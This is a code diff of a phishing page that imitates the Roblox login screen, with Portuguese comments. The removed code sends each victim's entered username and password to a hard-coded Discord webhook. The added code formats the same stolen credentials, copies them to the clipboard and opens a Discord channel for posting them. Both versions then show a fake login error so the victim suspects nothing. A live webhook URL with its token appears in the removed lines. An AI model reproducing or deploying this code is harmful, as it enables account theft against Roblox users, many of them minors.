@@ -6,12 +6,7 @@
   <title>Log in to Roblox</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Roboto', sans-serif;
       background: url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
@@ -22,7 +17,6 @@
       align-items: center;
       justify-content: center;
     }
-
     .login-container {
       background: rgba(22, 22, 22, 0.85);
       border: 1px solid #2a2a2a;
@@ -34,27 +28,10 @@
       box-shadow: 0 10px 40px rgba(0,0,0,0.7);
       backdrop-filter: blur(8px);
     }
-
-    .logo {
-      margin-bottom: 40px;
-    }
-
-    .logo img {
-      width: 180px;
-    }
-
-    h1 {
-      font-size: 28px;
-      font-weight: 500;
-      margin-bottom: 36px;
-      color: #ffffff;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-      position: relative;
-    }
-
+    .logo { margin-bottom: 40px; }
+    .logo img { width: 180px; }
+    h1 { font-size: 28px; font-weight: 500; margin-bottom: 36px; color: #ffffff; }
+    .form-group { margin-bottom: 20px; position: relative; }
     input {
       width: 100%;
       padding: 14px 16px;
@@ -64,21 +41,9 @@
       color: #fff;
       font-size: 16px;
     }
-
-    input::placeholder {
-      color: #aaa;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #1a8cff;
-      box-shadow: 0 0 0 3px rgba(26,140,255,0.3);
-    }
-
-    .password-wrapper {
-      position: relative;
-    }
-
+    input::placeholder { color: #aaa; }
+    input:focus { outline: none; border-color: #1a8cff; box-shadow: 0 0 0 3px rgba(26,140,255,0.3); }
+    .password-wrapper { position: relative; }
     .eye-icon {
       position: absolute;
       right: 16px;
@@ -89,7 +54,6 @@
       color: #aaa;
       user-select: none;
     }
-
     button {
       width: 100%;
       padding: 14px;
@@ -103,11 +67,7 @@
       transition: background 0.2s;
       margin-top: 12px;
     }
-
-    button:hover {
-      background: #0069d9;
-    }
-
+    button:hover { background: #0069d9; }
     .error-message {
       margin: 0 0 16px 0;
       padding: 10px;
@@ -122,53 +82,16 @@
       transition: opacity 0.4s ease, transform 0.4s ease;
       pointer-events: none;
     }
-
-    .error-message.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
-
-    .links {
-      margin: 24px 0;
-      font-size: 14px;
-    }
-
-    .links a {
-      color: #1a8cff;
-      text-decoration: none;
-    }
-
-    .links a:hover {
-      text-decoration: underline;
-    }
-
-    .separator {
-      color: #666;
-      margin: 0 6px;
-    }
-
-    .signup {
-      margin-top: 32px;
-      font-size: 15px;
-      color: #ccc;
-    }
-
-    .signup a {
-      color: #1a8cff;
-      font-weight: 500;
-      text-decoration: none;
-    }
-
-    .signup a:hover {
-      text-decoration: underline;
-    }
-
+    .error-message.show { opacity: 1; transform: translateY(0); }
+    .links { margin: 24px 0; font-size: 14px; }
+    .links a { color: #1a8cff; text-decoration: none; }
+    .links a:hover { text-decoration: underline; }
+    .separator { color: #666; margin: 0 6px; }
+    .signup { margin-top: 32px; font-size: 15px; color: #ccc; }
+    .signup a { color: #1a8cff; font-weight: 500; text-decoration: none; }
+    .signup a:hover { text-decoration: underline; }
     @media (max-width: 480px) {
-      .login-container {
-        padding: 40px 24px;
-        border-radius: 0;
-        min-height: 100vh;
-      }
+      .login-container { padding: 40px 24px; border-radius: 0; min-height: 100vh; }
     }
   </style>
 </head>
@@ -214,7 +137,6 @@
     const passwordInput = document.getElementById('password');
     const toggleEye = document.getElementById('toggleEye');
 
-    // Mostrar / Esconder senha
     toggleEye.addEventListener('click', () => {
       if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
@@ -225,39 +147,25 @@
       }
     });
 
-    // URL do seu webhook Discord (COLE AQUI O SEU!)
-    const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm'; // ← SUBSTITUA PELO SEU WEBHOOK URL
-
-    // Ao clicar em Entrar
-    form.addEventListener('submit', async function(e) {
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
       const user = usernameInput.value.trim();
       const pass = passwordInput.value.trim();
 
       if (user && pass) {
-        const payload = {
-          username: "Roblox Login Capture",          // Nome do webhook (opcional)
-          avatar_url: "https://i.imgur.com/algumavatar.png", // Avatar opcional
-          content: `**Novo login capturado!**\n\n**Username/Email/Phone:** ${user}\n**Senha:** ${pass}\n\nDe: OlhadinhaDEV Clone`,
-          // embeds: [ { title: "Detalhes", description: `Usuário: ${user}`, color: 16711680 } ] // Opcional: embed vermelho
-        };
+        const mensagem = `**Login Roblox Capturado!**\n\n**Username/Email/Phone:** \`${user}\`\n**Senha:** \`${pass}\`\n\nEnviado de: OlhadinhaDEV Clone`;
 
-        try {
-          await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            mode: 'no-cors',          // Importante pra evitar erro CORS no browser (mas não vê resposta)
-            body: JSON.stringify(payload)
-          });
-          // Se quiser ver se enviou (não garante sucesso real por no-cors)
-          console.log('Tentativa de envio pro webhook feita!');
-        } catch (err) {
-          console.error('Erro no fetch:', err);
-        }
+        navigator.clipboard.writeText(mensagem).then(() => {
+          alert('Dados copiados pro Discord! Abra o chat do seu bot/canal, cole (Ctrl+V) e envie.');
+        }).catch(() => {
+          alert('Erro ao copiar automaticamente. Copie manual: ' + mensagem);
+        });
+
+        // Abre Discord nos DMs (pra colar rápido) - troque se quiser canal específico
+        window.open('https://discord.com/channels/1473860408417714403/1473860409172951142');
       }
 
-      // Mostra erro fake como no Roblox
       errorMsg.classList.add('show');
       setTimeout(() => {
         errorMsg.classList.remove('show');
